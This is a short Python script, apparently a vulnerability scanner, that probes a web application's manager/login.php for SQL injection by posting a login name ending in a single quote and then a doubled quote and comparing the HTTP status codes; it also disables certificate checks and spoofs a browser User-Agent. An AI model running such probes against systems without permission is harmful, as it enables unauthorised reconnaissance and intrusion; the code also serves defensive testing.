import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"manager/index.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
		try:
			cookie=response.headers['Set-Cookie']
		except:
			cookie=''
	else:
		cookie=''
		r0=False
	url=baseurl+"manager/login.php"
	body="Name=admin'&Pass=123456"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded","Cookie": cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	response.encoding='utf8'
	if response.status_code==500:
		r1=True
	else:
		r1=False
	url=baseurl+"manager/login.php"
	body="Name=admin''&Pass=123456"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded","Cookie": cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	response.encoding='utf8'
	if response.status_code==200:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
